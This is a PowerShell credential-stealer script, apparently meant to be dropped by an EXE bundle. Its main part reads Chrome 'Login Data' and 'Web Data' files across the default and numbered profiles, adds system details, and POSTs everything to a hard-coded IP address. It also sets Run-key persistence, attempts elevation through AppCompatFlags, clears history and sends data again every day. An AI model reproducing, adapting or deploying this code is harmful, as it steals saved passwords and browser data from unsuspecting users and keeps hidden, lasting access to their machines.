
#everything is in a EXE bundle to build python to drop this script correctly.
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


$var += Get-NetIPConfiguration;Get-ComputerInfo;whoami;Get-Date

$var += Get-WinSystemLocale

# if profiles exist try 1 - 10 if not pull data normally... (GOOGLE CHROME)

if (Test-Path -Path "Profile 7") {

    $var += cat -Path "Profile 1\Web Data"

    $var += cat -Path "Profile 2\Login Data"

    $var += cat -Path "Profile 2\Web Data"

    $var += cat -Path "Profile 3\Login Data"

    $var += cat -Path "Profile 3\Web Data"

    $var += cat -Path "Profile 4\Login Data"

    $var += cat -Path "Profile 4 \Web Data"

    $var += cat -Path "Profile 5\Login Data"

    $var += cat -Path "Profile 5\Web Data"

    $var += cat -Path "Profile 6\Login Data"

    $var += cat -Path "Profile 6\Web Data"

    $var += cat -Path "Profile 7\Login Data"

    $var += cat -Path "Profile 7\Web Data"

    $var += cat -Path "Profile 8\Login Data"

    $var += cat -Path "Profile 8\Web Data"

    $var += cat -Path "Profile 9\Login Data"

    $var += cat -Path "Profile 9\Web Data"

    $var += cat -Path "Profile 10\Login Data"

    $var += cat -Path "Profile 10\Web Data"
}else{
    cd Default
    
    $var += Get-Content "Login Data"

    $var += Get-Content "Web Data"
}



$var += if (Test-Path -Path "Profile 1") { 
    "Profile 1 exists"
} else {
    "Profile 1 does not exist"
} 

$var += if (Test-Path -Path "Profile 2") {
    "Profile 2 exists"
} else {
    "Profile 2 does not exist"
}

$var += if (Test-Path -Path "Profile 3") {
    "Profile 3 exists"
} else {
    "Profile 3 does not exist"
}

$var += if (Test-Path -Path "Profile 4") {
    "Profile 4 exists"
} else {
    "Profile 4 does not exist"
}

$var += if (Test-Path -Path "Profile 5") {
    "Profile 5 exists"
} else {
    "Profile 5 does not exist"
}

$var += if (Test-Path -Path "Profile 6") {
    "Profile 6 exists"
} else {
    "Profile 6 does not exist"
}

$var += if (Test-Path -Path "Profile 7") {
    "Profile 7 exists"
} else {
    "Profile 7 does not exist"
}

$var += if (Test-Path -Path "Profile 8") {
    "Profile 8 exists"
} else {
    "Profile 8 does not exist"
}

$var += if (Test-Path -Path "Profile 9") {
    "Profile 9 exists"
} else {
    "Profile 9 does not exist"
}

$var += if (Test-Path -Path "Profile 10") {
    "Profile 10 exists"
} else {
    "Profile 10 does not exist"
}

start-sleep 4



#start http post 

#httpsend

$timeoutSeconds = 3
$code = {
    $Response = Invoke-WebRequest -Method Post -URI 192.168.2.37:80 -body $var -UseBasicParsing
    Get-ChildItem *.cs | select name
}
$j = Start-Job -ScriptBlock $code
if (Wait-Job $j -Timeout $timeoutSeconds) { Receive-Job $j }
Remove-Job -force $j

#attempt to set per

New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
    -Name "grabber4.ps1" `
    -Value "%LOCALAPPDATA%\Google\Chrome\User Data\grabber4.ps1 -autostart"

# attempt to elevate permissions on next execution

New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" `
    -Name "%LocalAppData%\Google\Chrome\User Data\grabber4.ps1" `
    -Value "%LocalAppData%\Google\Chrome\User Data\grabber4.ps1"

cd..

Clear-History

# after 24 hours start while true statement...

start-sleep 86400

#core system commands to keep

while($true)
{ 
    $varper += Get-ComputerInfo;whoami;Get-Date;ipconfig
    
    #http send
    $timeoutSeconds = 3
    $code = {
        $Response = Invoke-WebRequest -Method Post -URI 192.168.2.37:80 -body $var -UseBasicParsing
        Get-ChildItem *.cs | select name
    }
    $j = Start-Job -ScriptBlock $code
    if (Wait-Job $j -Timeout $timeoutSeconds) { Receive-Job $j }
    Remove-Job -force $j

    Start-Sleep -Seconds 86400
}
